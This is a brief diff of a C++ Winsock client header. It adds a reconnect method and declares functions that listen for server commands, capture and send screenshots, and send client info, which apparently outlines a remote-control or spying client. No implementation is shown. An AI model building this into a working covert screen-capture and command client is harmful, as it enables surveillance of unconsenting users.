@@ -5,21 +5,20 @@
 #include <winsock2.h>
 
 class Client {
-    const char* m_serverIP;
-    u_short m_port;
+    const std::string m_serverIP;
+    const u_short m_port;
     SOCKET m_socket;
     
 public:
-    Client(const char* serverIP_, u_short port);
+    Client(std::string serverIP_, u_short port);
     ~Client();
 
     void start();
     void stop() const;
+    void reconnect();
 
 private:
-    static void sendData(SOCKET sock, const std::string& str);
-    static void sendData(SOCKET sock, const std::vector<char>& data);
-    void listenForCommands() const;
+    void listenForCommands();
     static std::vector<BYTE> captureScreenshot();
     static void sendScreenshot(SOCKET sock);
     void sendClientInfo() const;  
